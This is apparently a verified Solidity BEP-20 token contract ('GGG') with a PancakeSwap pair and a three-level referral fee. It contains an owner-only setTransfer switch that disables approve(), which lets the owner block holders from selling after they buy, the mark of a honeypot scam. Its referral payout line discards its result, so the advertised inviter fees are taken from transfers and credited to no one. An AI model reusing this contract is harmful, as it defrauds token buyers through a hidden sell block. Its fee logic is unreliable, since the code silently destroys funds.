/**
 *Submitted for verification at BscScan.com on 2021-12-03
*/

pragma solidity ^0.5.12;

contract ERC20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}
interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b); 
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract GGGToken is ERC20Interface{
  using SafeMath for uint;

  string public symbol;
  string public  name;
  uint8 public decimals;
  uint _totalSupply;
  mapping(address => address) public inviter;
  uint256[3] inviterFee = [40,20,10];
  mapping(address => uint256) balances;
  mapping(address => mapping(address => uint)) allowed;
  address public uniswapV2Pair;
  IUniswapV2Router02  uniswapV2Router;
  address owner;
  bool public canTransfer;
  constructor() public {
    symbol = "GGG";
    name = "GGG";
    decimals = 18;
	owner = msg.sender;
	canTransfer = true;
    _totalSupply = 100000000000 * 10**uint(decimals);
    balances[msg.sender] = _totalSupply;
	        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
    emit Transfer(address(0), msg.sender, _totalSupply);
	
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply;
  }
  function setTransfer(bool set) public returns(bool){
	require(msg.sender == owner);
	canTransfer = set;
	return canTransfer;
  }
  
  function balanceOf(address tokenOwner) public view returns (uint balance) {
    return balances[tokenOwner];
  }
  function transfer(address to, uint amount) public returns (bool success) { 
    if  (inviter[to] == address(0)){
		inviter[to] = msg.sender;
	}
    balances[msg.sender] = balances[msg.sender].sub(amount);
    balances[to] = balances[to].add(amount);	
    emit Transfer(msg.sender, to, amount);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    require(spender != address(0), "spender address is a zero address");   
	require(canTransfer == true);
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function transferFrom(address from, address to, uint256 amount) public returns (bool success) {  
    balances[from] = balances[from].sub(amount);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(amount);
	address cur;
	uint256 realAmount = amount;
	if(to == uniswapV2Pair){
		cur = from;
	}else if(from == uniswapV2Pair){
		cur = to;
	}
	for (uint256 i = 0; i < 3; i++) {
		cur = inviter[cur];
        if (cur == address(0)) {
            break;
		}
		else{
			balances[cur].add(amount.mul(inviterFee[i]).div(1000));
			realAmount = realAmount-amount.mul(inviterFee[i]).div(1000);
		}
        }

    balances[to] = balances[to].add(realAmount);	
    emit Transfer(from, to, realAmount);
    return true;
  }

  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
}